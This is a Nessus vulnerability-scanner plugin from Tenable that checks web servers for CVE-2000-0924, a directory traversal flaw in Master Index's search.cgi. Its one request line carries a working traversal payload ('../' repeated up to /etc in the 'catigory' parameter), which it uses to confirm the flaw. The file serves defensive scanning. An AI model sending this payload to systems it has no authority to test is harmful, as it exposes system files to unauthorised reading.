#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10562);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0924");
 script_bugtraq_id(1772);
 script_osvdb_id(461);

 script_name(english:"Master Index search.cgi Traversal Arbitrary File/Directory Access");
 script_summary(english:"Attempts a directory traversal attack");
 
 script_set_attribute( attribute:"synopsis",  value:
"A web application on the remote host has a directory traversal
vulnerability." );
 script_set_attribute( attribute:"description",  value:
"The version of Master Index running on the remote web server has a
directory traversal vulnerability.  Input to the 'catigory'
parameter of search.cgi is not properly sanitized.  A remote attacker
could exploit this to read arbitrary files from the system." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Oct/142"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/11/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/10/09");
 script_cvs_date("$Date: 2016/11/19 01:42:51 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 url = string(dir, "/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc");
 r = http_send_recv3(method:"GET", item:url, port:port);
 if("passwd" >< r[2] && "resolv.conf" >< r[2] ){
 	security_warning(port);
	exit(0);
	}
}
